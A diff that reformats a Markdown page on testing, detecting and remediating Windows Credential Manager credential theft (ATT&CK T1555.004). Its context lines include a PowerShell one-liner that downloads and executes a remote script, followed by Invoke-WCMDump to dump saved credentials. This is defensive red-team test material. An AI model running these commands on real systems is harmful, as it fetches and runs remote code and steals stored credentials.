@@ -98,7 +98,6 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 Invoke-WCMDump
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -112,33 +111,31 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1042 Disable or Remove Feature or Program
-Consider enabling the “Network access: Do not allow storage of passwords and credentials for network authentication” setting that will prevent network credentials from being stored by the Credential Manager.
 
+Consider enabling the “Network access: Do not allow storage of passwords and credentials for network authentication” setting that will prevent network credentials from being stored by the Credential Manager.
 
 ## Detection
 
 ### Detect Suspicious Access to Windows Credential Manager
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Windows Credential Manager technique applicable | High | Credential Access |
+| Finding                                         | Severity | Impact            |
+| ----------------------------------------------- | -------- | ----------------- |
+| Windows Credential Manager technique applicable | High     | Credential Access |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                                |
+| ------- | ------------------------------------ |
 | CWE-522 | Insufficiently Protected Credentials |
-
 
 ## References
 
 - [Malwarebytes The Windows Vault](https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/)
 - [Delpy Mimikatz Crendential Manager](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
-- [Microsoft Credential Locker](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-8.1-and-8/jj554668(v=ws.11)?redirectedfrom=MSDN)
-- [Microsoft Credential Manager store](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#credential-manager-store)
+- [Microsoft Credential Locker](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-8.1-and-8/jj554668(v=ws.11)?redirectedfrom=MSDN>)
+- [Microsoft Credential Manager store](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#credential-manager-store>)
 - [Microsoft CredEnumerate](https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratea)
 - [passcape Windows Vault](https://www.passcape.com/windows_password_recovery_vault_explorer)
 - [Atomic Red Team - T1555.004](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1555.004)
